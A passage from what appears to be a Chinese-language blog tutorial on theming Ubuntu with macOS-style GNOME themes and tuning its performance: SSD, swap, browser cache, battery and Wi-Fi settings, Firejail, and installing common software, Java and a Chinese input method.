修改光标为<code>OSX-ElCap</code></p><p> <img src="/images/Linuxmeihua/26.png" alt="26.png"></p></li></ol><h2 id="Gnome-shell主题"><a href="#Gnome-shell主题" class="headerlink" title="Gnome shell主题"></a>Gnome shell主题</h2><ol><li><p>访问<code>https://www.gnome-look.org</code>，搜索<code>macOS MOJAVE</code>，下载</p><p> <img src="/images/Linuxmeihua/27.png" alt="27.png"></p></li><li><p>将<code>OSX.for.Dash.to.PANEL.tar.xz</code>解压，进入此目录</p></li><li><p>进入<code>FONT</code>目录，打开两个字体文件，点击安装</p></li><li><p>进入<code>3.26-3.28</code>目录(此名称标识了<code>Gnome</code>的版本)，将其中的<code>Mojave</code>剪切至当前用户家目录下的<code>.themes/</code>中</p></li><li><p>将<code>.themes/Mojave-light/gnome-shell/assets/</code>下的<code>activities.svg</code>复制至<code>.themes/Mojave/gnome-shell/assets/</code>中</p></li><li><p>打开<code>.themes/Mojave-light/gnome-shell/</code>目录下的<code>gnome-shell.css</code>文件</p><p> 搜索<code>#panel #panelActiv</code></p><p> <img src="/images/Linuxmeihua/28.png" alt="28.png"></p><p> 将对应配置内容复制到<code>.themes/Mojave/gnome-shell/</code>目录下的<code>gnome-shell.css</code>文件对应位置上</p><p> <img src="/images/Linuxmeihua/29.png" alt="29.png"></p></li><li><p>设置<code>tweaks</code></p><p> 修改<code>shell</code>为<code>Mojave</code></p><p> <img src="/images/Linuxmeihua/30.png" alt="30.png"></p></li><li><p>修改窗口标题、界面、文档字体为<code>san francisco</code></p><p> <img src="/images/Linuxmeihua/45.png" alt="45.png"></p></li></ol><h2 id="常用gnome扩展插件"><a href="#常用gnome扩展插件" class="headerlink" title="常用gnome扩展插件"></a>常用gnome扩展插件</h2><p>访问<code>https://extensions.gnome.org</code>，安装<code>NetSpeed</code>、<code>OpenWeather</code></p><h2 id="plank-Dock"><a href="#plank-Dock" class="headerlink" title="plank Dock"></a>plank Dock</h2><ol><li><p>安装<code>plank</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install plank</span><br></pre></td></tr></table></figure></li><li><p>卸载<code>Ubuntu</code>自带<code>Dock</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt remove gnome-shell-extension-ubuntu-dock</span><br></pre></td></tr></table></figure></li><li><p>将<code>plank</code>加入开机自启</p><p> 设置<code>tweaks</code></p><p> <img src="/images/Linuxmeihua/31.png" alt="31.png"></p></li><li><p>隐藏侧边<code>Dock</code></p><p> <img src="/images/Linuxmeihua/32.png" alt="32.png"></p><p> 访问<code>https://extensions.gnome.org</code>，安装<code>Hide Dash X</code>即可</p></li><li><p>重启操作系统</p></li><li><p>访问<code>https://www.gnome-look.org</code>，搜索<code>Transparent Plank Theme</code>，下载</p><p> <img src="/images/Linuxmeihua/33.png" alt="33.png"></p></li><li><p>将<code>Transparent 2.0.tar.gz</code>解压后剪切至当前用户家目录下的<code>.local/share/plank/themes</code>目录中</p></li><li><p>设置<code>plank</code>主题</p><p> <img src="/images/Linuxmeihua/34.png" alt="34.png"></p></li></ol><h2 id="GDM主题-锁屏界面"><a href="#GDM主题-锁屏界面" class="headerlink" title="GDM主题(锁屏界面)"></a>GDM主题(锁屏界面)</h2><ol><li><p>访问<code>https://www.gnome-look.org</code>，搜索<code>High Ubunterra</code>，下载</p><p> <img src="/images/Linuxmeihua/35.png" alt="35.png"></p></li><li><p>将<code>High_Ubunterra_2.3(noPass).tar.xz</code>解压，进入解压目录，执行</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x install.sh</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure><p> <img src="/images/Linuxmeihua/36.png" alt="36.png"></p></li><li><p>按<code>Alt+F2</code>，输入<code>r</code>，回车</p><p> <img src="/images/Linuxmeihua/37.png" alt="37.png"></p></li><li><p>设置桌面壁纸与锁屏壁纸</p><p> <img src="/images/Linuxmeihua/38.png" alt="38.png"></p><p> 桌面</p><p> <img src="/images/Linuxmeihua/39.png" alt="39.png"></p><p> 锁屏</p><p> <img src="/images/Linuxmeihua/40.png" alt="40.png"></p></li></ol><h2 id="任务切换动画效果"><a href="#任务切换动画效果" class="headerlink" title="任务切换动画效果"></a>任务切换动画效果</h2><ol><li><p>访问<code>https://extensions.gnome.org</code>，安装<code>Cover-flow Alt-Tab</code></p></li><li><p>设置<code>tweaks</code></p><p> <img src="/images/Linuxmeihua/41.png" alt="41.png"></p></li></ol><h2 id="Plymouth主题-开机引导画面"><a href="#Plymouth主题-开机引导画面" class="headerlink" title="Plymouth主题(开机引导画面)"></a>Plymouth主题(开机引导画面)</h2><ol><li><p>访问<code>https://www.gnome-look.org</code>，选择<code>Plymouth Themes</code>类型，选择合适的主题</p></li><li><p>按照主题配置文档进行设置即可</p></li></ol><hr><h1 id="conky"><a href="#conky" class="headerlink" title="conky"></a>conky</h1><p>系统信息监控与展示</p><ol><li><p>桌面工具，展示性编程文件</p></li><li><p><code>CPU</code>、内存、硬盘性能参数</p></li><li><p>结合其他工具获取系统信息(硬件温度、音乐播放、站外资源请求等)</p></li><li><p>配合<code>lua</code>、<code>python</code>开发语言实现复杂功能</p></li><li><p>需要大量配置文件的编辑优化</p></li><li><p>许多效果需显卡驱动支持</p></li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install conky-all</span><br></pre></td></tr></table></figure><h2 id="conky美化主题"><a href="#conky美化主题" class="headerlink" title="conky美化主题"></a>conky美化主题</h2><p><a href="https://www.deviantart.com/custom-linux/gallery/39357745/Conky-Themes" target="_blank" rel="noopener">https://www.deviantart.com/custom-linux/gallery/39357745/Conky-Themes</a></p><hr><h1 id="操作系统性能优化"><a href="#操作系统性能优化" class="headerlink" title="操作系统性能优化"></a>操作系统性能优化</h1><h2 id="优化原则"><a href="#优化原则" class="headerlink" title="优化原则"></a>优化原则</h2><ol><li><p>完全不优化或过度优化都不可取</p></li><li><p>笔记本用户重点关注电池、<code>SSD</code>硬盘寿命</p></li></ol><h2 id="SSD硬盘优化"><a href="#SSD硬盘优化" class="headerlink" title="SSD硬盘优化"></a>SSD硬盘优化</h2><h3 id="SSD分区对齐"><a href="#SSD分区对齐" class="headerlink" title="SSD分区对齐"></a>SSD分区对齐</h3><p>目前主流<code>Linux</code>操作系统已自动对齐文件系统和分区–页面大小4096字节</p><h3 id="激活SATA驱动器的AHCI特性"><a href="#激活SATA驱动器的AHCI特性" class="headerlink" title="激活SATA驱动器的AHCI特性"></a>激活SATA驱动器的AHCI特性</h3><p>某些<code>BIOS</code>/<code>UEFI</code>只有在激活此特性后才可正确识别<code>SSD</code>硬盘</p><p><code>Advanced</code>–<code>Integrated Peripherais</code>–<code>AHCI</code></p><h3 id="减少写操作"><a href="#减少写操作" class="headerlink" title="减少写操作"></a>减少写操作</h3><p>频繁的写操作会磨损<code>SSD</code></p><h4 id="over-provisioning"><a href="#over-provisioning" class="headerlink" title="over-provisioning"></a>over-provisioning</h4><p>通过保存1/4未分配的空间提高<code>SSD</code>的性能和寿命(最大不超过<code>10G</code>)</p><p>较新的<code>SSD</code>内置预留空间(用户无法访问)，不再需要<code>over-provisioning</code></p><h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><p>推荐使用<code>ext4</code>文件系统</p><p><code>ext4</code>日志不会产生较多的写操作，日志对于系统崩溃恢复非常重要，建议保留</p><p>不建议使用<code>BTRFS</code>文件系统，它会导致大量的写操作</p><h4 id="禁用读文件时访问时间戳的写操作"><a href="#禁用读文件时访问时间戳的写操作" class="headerlink" title="禁用读文件时访问时间戳的写操作"></a>禁用读文件时访问时间戳的写操作</h4><p>系统在读文件时会对文件的时间戳进行写操作，但并没有实际的用处</p><p>为除<code>swap</code>之外的每个分区增加<code>noatime</code>选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/fstab</span><br><span class="line"></span><br><span class="line">增加</span><br><span class="line">noatime,errors=remount-ro 01</span><br></pre></td></tr></table></figure><p>重启生效</p><h3 id="定期清理硬盘"><a href="#定期清理硬盘" class="headerlink" title="定期清理硬盘"></a>定期清理硬盘</h3><h4 id="TRIM"><a href="#TRIM" class="headerlink" title="TRIM"></a>TRIM</h4><p>默认每周启动一次，对硬盘进行清理</p><h5 id="查看是否支持TRIM"><a href="#查看是否支持TRIM" class="headerlink" title="查看是否支持TRIM"></a>查看是否支持TRIM</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hdparm -I /dev/sda | grep TRIM</span><br></pre></td></tr></table></figure><h5 id="查看TRIM的运行状态"><a href="#查看TRIM的运行状态" class="headerlink" title="查看TRIM的运行状态"></a>查看TRIM的运行状态</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status fstrim</span><br></pre></td></tr></table></figure><h5 id="手动执行TRIM"><a href="#手动执行TRIM" class="headerlink" title="手动执行TRIM"></a>手动执行TRIM</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fstrim -v /</span><br></pre></td></tr></table></figure><h5 id="设置每天清理"><a href="#设置每天清理" class="headerlink" title="设置每天清理"></a>设置每天清理</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -v /etc/systemd/system/fstrim.timer.d</span><br><span class="line">sudo touch /etc/systemd/system/fstrim.timer.d/override.conf</span><br><span class="line">gedit admin:///etc/systemd/system/fstrim.timer.d/override.conf</span><br><span class="line"></span><br><span class="line">[Timer]</span><br><span class="line">OnCalendar=</span><br><span class="line">OnCalendar=daily</span><br></pre></td></tr></table></figure><h2 id="CPU微码"><a href="#CPU微码" class="headerlink" title="CPU微码"></a>CPU微码</h2><p>用于提高性能或为安全补丁</p><h3 id="intel-CPU"><a href="#intel-CPU" class="headerlink" title="intel CPU"></a>intel CPU</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install intel-microcode</span><br></pre></td></tr></table></figure><h3 id="AMD-CPU"><a href="#AMD-CPU" class="headerlink" title="AMD CPU"></a>AMD CPU</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install amd64-microcode</span><br></pre></td></tr></table></figure><h2 id="交换分区-文件"><a href="#交换分区-文件" class="headerlink" title="交换分区/文件"></a>交换分区/文件</h2><p><code>Ubuntu</code>操作系统默认当内存剩余60%时就将内存中的数据写入<code>SWAP</code>中，这样会导致运行缓慢。减少使用<code>SWAP</code>可提高性能</p><p>通过修改<code>swappiness</code>内核参数(0-100)来决定<code>RAM</code>写入<code>SWAP</code>的百分比</p><p>查看当前<code>swappiness</code>内核参数设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/vm/swappiness</span><br></pre></td></tr></table></figure><p>修改<code>swappiness</code>内核参数设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">增加</span><br><span class="line">vm.swappiness=10</span><br></pre></td></tr></table></figure><h2 id="硬盘缓存"><a href="#硬盘缓存" class="headerlink" title="硬盘缓存"></a>硬盘缓存</h2><p>正常情况下，程序等待写硬盘结束后，才进行下一步操作</p><p>若数据只写入缓存就进行下一步操作，则速度提升。但<strong>存在数据丢失的风险</strong></p><p>开启此功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Disk工具--Drive Settings--Enable Write Cache</span><br></pre></td></tr></table></figure><h2 id="提升显示效果-防止撕裂"><a href="#提升显示效果-防止撕裂" class="headerlink" title="提升显示效果(防止撕裂)"></a>提升显示效果(防止撕裂)</h2><p>针对英伟达显卡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/default/grub</span><br><span class="line"></span><br><span class="line">修改为</span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet nvidia-drm.modeset=1&quot;</span><br></pre></td></tr></table></figure><p>生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo update-grub</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>验证设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xrandr --verbose | grep PRIME</span><br></pre></td></tr></table></figure><h2 id="Firefox浏览器优化"><a href="#Firefox浏览器优化" class="headerlink" title="Firefox浏览器优化"></a>Firefox浏览器优化</h2><h3 id="修改Firefox网络缓存"><a href="#修改Firefox网络缓存" class="headerlink" title="修改Firefox网络缓存"></a>修改Firefox网络缓存</h3><p>将<code>Firefox</code>网络缓存放入<code>RAM</code>，可提高运行速度</p><ol><li><p>访问<code>about:config</code></p></li><li><p>禁用<code>Firefox</code>将缓存写入硬盘</p><p> 搜索<code>browser.cache.disk.enable</code>，将其修改为<code>false</code></p></li><li><p>开启<code>Firefox</code>将缓存写入内存</p><p> 搜索<code>browser.cache.memory.enable</code>，将其修改为<code>true</code></p></li><li><p>设置<code>Firefox</code>缓存使用的最大的内存空间</p><p> 新建<code>integer</code>，参数设置为<code>browser.cache.memory.capacity</code>，值为204800</p></li></ol><h3 id="禁用sessionstore"><a href="#禁用sessionstore" class="headerlink" title="禁用sessionstore"></a>禁用sessionstore</h3><p><code>sessionstore</code>：当<code>Firefox</code>意外崩溃后，重新启动后<code>Firefox</code>会进行恢复，这会导致大量的写操作，禁用可提高性能，保护硬盘，但会导致无法进行恢复</p><ol><li><p>访问<code>about:config</code></p></li><li><p>搜索<code>browser.sessionstore.interval</code>，修改值为15000000</p></li></ol><h3 id="禁用Firefox无必要的网络访问"><a href="#禁用Firefox无必要的网络访问" class="headerlink" title="禁用Firefox无必要的网络访问"></a>禁用Firefox无必要的网络访问</h3><p><code>Firefox</code>会周期请求<code>http://detectportal.firefox.com/success.txt</code>，用于网络探测</p><ol><li><p>访问<code>about:config</code></p></li><li><p>搜索<code>network.captive-portal-service.enabled</code>，修改值为<code>false</code></p></li></ol><h2 id="Chrome优化"><a href="#Chrome优化" class="headerlink" title="Chrome优化"></a>Chrome优化</h2><h3 id="限制Chrome写硬盘"><a href="#限制Chrome写硬盘" class="headerlink" title="限制Chrome写硬盘"></a>限制Chrome写硬盘</h3><p><code>settings</code>–<code>Advanced</code>–<code>Privacy</code>–关闭<code>Use a prediction service to load pages more quickly</code></p><h2 id="禁用休眠"><a href="#禁用休眠" class="headerlink" title="禁用休眠"></a>禁用休眠</h2><p>休眠时磁盘会挂起，会导致大量的写操作，对<code>SSD</code>尤其不利</p><p><code>Ubuntu</code>中默认已禁用休眠</p><h2 id="碎片整理"><a href="#碎片整理" class="headerlink" title="碎片整理"></a>碎片整理</h2><p><code>Linux</code>无必要进行碎片整理，碎片整理会导致大量的写操作，会短时间内毁坏<code>SSD</code></p><h2 id="优化启动项"><a href="#优化启动项" class="headerlink" title="优化启动项"></a>优化启动项</h2><p>删除不需要的启动项</p><ol><li><p>将系统隐藏启动项进行显示</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i &apos;s/NoDisplay=true/NoDisplay=false/g&apos; /etc/xdg/autostart/*.desktop</span><br></pre></td></tr></table></figure></li><li><p>设置启动项</p></li></ol><p><code>startup applications</code>工具</p><h2 id="系统清理"><a href="#系统清理" class="headerlink" title="系统清理"></a>系统清理</h2><ol><li><p><code>stacer</code></p><p> <a href="https://github.com/oguzhaninan/Stacer" target="_blank" rel="noopener">https://github.com/oguzhaninan/Stacer</a></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:oguzhaninan/stacer -y</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install stacer -y</span><br></pre></td></tr></table></figure></li><li><p><code>bleachbit</code></p><p> 已集成于<code>Ubuntu</code>操作系统中</p></li></ol><h2 id="优化笔记本电池寿命"><a href="#优化笔记本电池寿命" class="headerlink" title="优化笔记本电池寿命"></a>优化笔记本电池寿命</h2><p>手动优化及其复杂，使用<code>tlp</code>工具进行自动优化</p><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install tlp tlp-rdw</span><br></pre></td></tr></table></figure><p>启动优化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tlp start</span><br></pre></td></tr></table></figure><p>查看优化配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tlp-stat</span><br></pre></td></tr></table></figure><h2 id="CPU温度监视"><a href="#CPU温度监视" class="headerlink" title="CPU温度监视"></a>CPU温度监视</h2><p><code>sensors</code>工具</p><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lm-sensors</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sensors</span><br></pre></td></tr></table></figure><h2 id="限制inode缓存"><a href="#限制inode缓存" class="headerlink" title="限制inode缓存"></a>限制inode缓存</h2><p>在<code>Linux</code>上，一个文件由一个<code>inode</code>表示。<code>inode</code>在系统管理员看来是每一个文件的唯一标识，在系统里面，<code>inode</code>是一个结构，存储了关于这个文件的大部分信息。一个<code>inode</code>一般占了<code>128KB</code>或者是<code>256KB</code></p><p>限制<code>inode</code>缓存的代价是某些系统项将在<code>RAM</code>中保留更长的时间，将减少用于一般任务的可用<code>RAM</code>的数量</p><p>建议内存大于<code>4GB</code>的计算机限制<code>inode</code>缓存，可提高计算机运行速度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gedit admin:///etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">增加配置</span><br><span class="line"># Improve cache management</span><br><span class="line">vm.vfs_cache_pressure=50</span><br></pre></td></tr></table></figure><h2 id="tmp目录"><a href="#tmp目录" class="headerlink" title="/tmp目录"></a>/tmp目录</h2><p><code>/tmp</code>目录用于存放计算机的中间或临时数据</p><p><code>/tmp</code>默认存放在硬盘中，将其存放到内存中会加快运行速度，因会占用内存空间，建议<code>8G</code>以上内存用户设置</p><ol><li><p>将<code>/tmp</code>转至<code>/tmpfs</code>(放入内存)</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp -v /usr/share/systemd/tmp.mount /etc/systemd/system/</span><br><span class="line">sudo systemctl enable tmp.mount &amp;&amp; reboot</span><br></pre></td></tr></table></figure></li><li><p>查看状态</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status tmp.mount</span><br></pre></td></tr></table></figure></li><li><p>取消使用<code>/tmpfs</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -v /etc/systemd/system/tmp.mount</span><br></pre></td></tr></table></figure></li></ol><h2 id="无线优化"><a href="#无线优化" class="headerlink" title="无线优化"></a>无线优化</h2><h3 id="禁用无线芯片电源管理"><a href="#禁用无线芯片电源管理" class="headerlink" title="禁用无线芯片电源管理"></a>禁用无线芯片电源管理</h3><p>以提高用电为代价，提高速度和无线质量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gedit admin:///etc/NetworkManager/conf.d/default-wifi-powersave-on.conf</span><br><span class="line"></span><br><span class="line">修改</span><br><span class="line">wifi.powersave=2</span><br></pre></td></tr></table></figure><p>重启生效</p><h3 id="开启英特尔无线网卡Tx-AMPDU功能"><a href="#开启英特尔无线网卡Tx-AMPDU功能" class="headerlink" title="开启英特尔无线网卡Tx AMPDU功能"></a>开启英特尔无线网卡Tx AMPDU功能</h3><h4 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h4><ol><li><p>英特尔无线芯片运行在<code>iwlwifi</code>驱动程序上</p></li><li><p>打开<code>Tx AMPDU</code>可提高无线速度(部分芯片可能不稳定)</p></li></ol><h4 id="检查驱动是否为iwlwifi"><a href="#检查驱动是否为iwlwifi" class="headerlink" title="检查驱动是否为iwlwifi"></a>检查驱动是否为iwlwifi</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsmod | grep iwlwifi</span><br></pre></td></tr></table></figure><h4 id="开启提速"><a href="#开启提速" class="headerlink" title="开启提速"></a>开启提速</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;options iwlwifi 11n_disable=8&quot; | sudo tee /etc/modprobe.d/iwlwifi11n.conf</span><br></pre></td></tr></table></figure><h4 id="删除配置"><a href="#删除配置" class="headerlink" title="删除配置"></a>删除配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -v /etc/modprobe.d/iwlwifi11n.conf</span><br></pre></td></tr></table></figure><h2 id="部分重启-partial-reboot"><a href="#部分重启-partial-reboot" class="headerlink" title="部分重启/partial reboot"></a>部分重启/partial reboot</h2><p><code>Linux</code>如果死机，可尝试<code>partial reboot</code>(按下<code>ctrl+alt+back</code>重启桌面)</p><p>配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gedit admin:///etc/default/keyboard</span><br><span class="line"></span><br><span class="line">增加</span><br><span class="line">XKBOPTIONS=&quot;terminate:ctrl_alt_bksp&quot;</span><br></pre></td></tr></table></figure><p>重启生效</p><h2 id="FireJail沙箱"><a href="#FireJail沙箱" class="headerlink" title="FireJail沙箱"></a>FireJail沙箱</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install firejail</span><br></pre></td></tr></table></figure><h3 id="将应用程序以沙箱运行"><a href="#将应用程序以沙箱运行" class="headerlink" title="将应用程序以沙箱运行"></a>将应用程序以沙箱运行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firejail firefox</span><br></pre></td></tr></table></figure><h3 id="查看以沙箱运行的应用程序"><a href="#查看以沙箱运行的应用程序" class="headerlink" title="查看以沙箱运行的应用程序"></a>查看以沙箱运行的应用程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firejail --tree</span><br></pre></td></tr></table></figure><hr><h1 id="生产力软件"><a href="#生产力软件" class="headerlink" title="生产力软件"></a>生产力软件</h1><h2 id="基础软件包"><a href="#基础软件包" class="headerlink" title="基础软件包"></a>基础软件包</h2><ol><li><p><code>flashplugin-installer</code>：浏览器<code>flash</code>插件</p></li><li><p><code>meld</code>：用于比对两个目录或文件的差异</p></li><li><p><code>amule</code>：电驴下载工具</p></li><li><p><code>transmission</code>、<code>qbittorrent</code>：<code>BT</code>下载工具</p></li><li><p><code>ttf-wqy-microhei</code>：文泉驿微米黑字体</p></li><li><p><code>mtr</code>：网络路径追踪工具</p></li><li><p><code>whois</code>：<code>IP</code>、域名注册信息查询工具</p></li><li><p><code>git</code>：<code>github</code>下载</p></li><li><p><code>curl</code>：完成浏览器请求服务器的命令行工具</p></li><li><p><code>obs-studio</code>：录屏软件，直播软件</p></li><li><p><code>ubuntu-restricted-extras</code>：一组视频解码器</p></li><li><p><code>libavcodec-extra</code>、<code>libdvd-pkg</code>：支持<code>dvd</code>格式播放</p></li><li><p><code>unrar</code>、<code>unrar-free</code>：<code>rar</code>格式解压</p></li><li><p><code>woeusb</code>：<code>U</code>盘刻录工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:nilarimogard/webupd8</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install woeusb</span><br></pre></td></tr></table></figure></li><li><p><code>ascii</code>：查看<code>ASCII</code>编码</p></li><li><p><code>unicode</code>：<code>unicode</code>编码转换工具</p></li><li><p><code>axel</code>：字符界面下载工具</p></li><li><p><code>flameshot</code>：截图工具</p></li><li><p><code>xfce4-taskmanager</code>：杀死卡顿的应用程序，可以快速定位应用程序窗口</p></li><li><p><code>Remmina</code>：远程连接工具，可很好支持<code>rdp</code>连接</p></li><li><p><code>CopyQ</code>：剪贴板管理器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:hluk/copyq</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install copyq</span><br></pre></td></tr></table></figure></li></ol><h2 id="安装JAVA"><a href="#安装JAVA" class="headerlink" title="安装JAVA"></a>安装JAVA</h2><ol><li><p>下载<code>jdk1.8</code>版本<code>tar</code>包</p><p> <a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a></p></li><li><p>解压<code>tar</code>包</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf jdk-8u171-linux-x64.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>移动位置</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv jdk1.8.0_171  /usr/local/jdk1.8</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME=/usr/local/jdk1.8 </span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre </span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib </span><br><span class="line">export PATH=.:$&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure></li><li><p>环境变量生效</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure></li><li><p>查看是否安装成功</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java</span><br><span class="line">javac</span><br></pre></td></tr></table></figure></li></ol><h2 id="中文输入法"><a href="#中文输入法" class="headerlink" title="中文输入法"></a>中文输入法</h2><ol><li><p>安装</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ibus ibus-pinyin</span><br></pre></td></tr></table></figure></li><li><p>配置</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">im-config</span><br></pre></td></tr></table></figure><p> <img src="/images/Linuxmeihua/42.png" alt="42.png"></p></li><li><p>重启操作系统</p></li><li><p>添加输入法</p><p> <img src="/images/Linuxmeihua/43.png" alt="43.png"></p></li><li><p>修复<code>BUG</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ibus-setup</span><br></pre></td></tr></table></figure><p> 取消<code>embed</code>勾选项</p><p> <img src="/images/Linuxmeihua/44.png" alt="44.png"></p></li></ol><h2 id="常用软件"><a href="#常用软件" class="headerlink" title="常用软件"></a>常用软件</h2><h3 id="Chrome"><a href="#Chrome" class="headerlink" 